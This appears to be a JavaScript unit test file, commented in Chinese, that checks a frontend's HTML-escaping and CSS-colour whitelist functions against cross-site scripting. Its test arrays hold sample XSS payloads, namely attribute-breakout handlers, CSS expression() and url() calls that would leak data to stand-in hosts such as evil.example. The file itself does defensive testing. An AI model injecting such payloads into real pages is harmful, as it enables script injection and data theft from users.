// 转义与 CSS 颜色白名单契约：属性插值是 XSS 主要入口，这里锁住行为防回归。
// 只加载 frontend/js/stats.js（全是函数声明，无顶层副作用），不需要 DOM。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
globalThis.window = globalThis;
vm.runInThisContext(fs.readFileSync(path.join(root, 'frontend/js/stats.js'), 'utf8'), { filename: 'stats.js' });

test('esc 覆盖 & < > 双引号 单引号', () => {
  assert.equal(esc('&<>"\''), '&amp;&lt;&gt;&quot;&#39;');
  assert.equal(esc('a" onmouseover="alert(1)'), 'a&quot; onmouseover=&quot;alert(1)');
  assert.equal(esc("a' onfocus='alert(1)"), 'a&#39; onfocus=&#39;alert(1)');
  assert.equal(esc(0), '0');
  assert.equal(esc(null), 'null');
});

test('cssColor 放行项目实际使用的颜色写法', () => {
  // 提醒紧急度映射成语义 token（entities.js），必须原样保留，否则圆点全变灰。
  assert.equal(cssColor('var(--accent)', '#8e8e93'), 'var(--accent)');
  assert.equal(cssColor('var(--orange)', '#8e8e93'), 'var(--orange)');
  assert.equal(cssColor('var(--red)', '#8e8e93'), 'var(--red)');
  assert.equal(cssColor('#007AFF', '#8e8e93'), '#007AFF');
  assert.equal(cssColor('#fff', '#8e8e93'), '#fff');
  assert.equal(cssColor('rgba(0,122,255,.5)', '#8e8e93'), 'rgba(0,122,255,.5)');
  assert.equal(cssColor('red', '#8e8e93'), 'red');
});

test('cssColor 挡住 url() 外传与属性突破，回落到 fallback', () => {
  for (const bad of [
    'url(https://evil.example/?leak=1)',
    'red" onmouseover="alert(1)',
    "red' onfocus='alert(1)",
    'expression(alert(1))',
    'var(--x);background:url(https://evil/)',
    '',
    null,
    undefined,
  ]) {
    assert.equal(cssColor(bad, '#8e8e93'), '#8e8e93', '应回落：' + JSON.stringify(bad));
  }
  assert.equal(cssColor('url(x)'), 'currentColor', '无 fallback 时用 currentColor');
});

test('危险插值点已改用 esc / cssColor（静态守卫）', () => {
  const read = f => fs.readFileSync(path.join(root, f), 'utf8');
  const home = read('frontend/js/home.js');
  assert.ok(home.includes('background:${cssColor(r.color'), '提醒圆点颜色必须过白名单');
  assert.ok(home.includes('<option value="${esc(p.id)}">'), '项目 id 进 value 属性必须转义');
  const plate = read('frontend/tools/plate.js');
  assert.ok(plate.includes('background:${cssColor(a.Color'), 'XML 导入的 Area 颜色必须过白名单');
  const inv = read('frontend/tools/inventory.js');
  assert.ok(inv.includes("esc(r.unit || '')"), '单位来自表单输入，必须转义');
});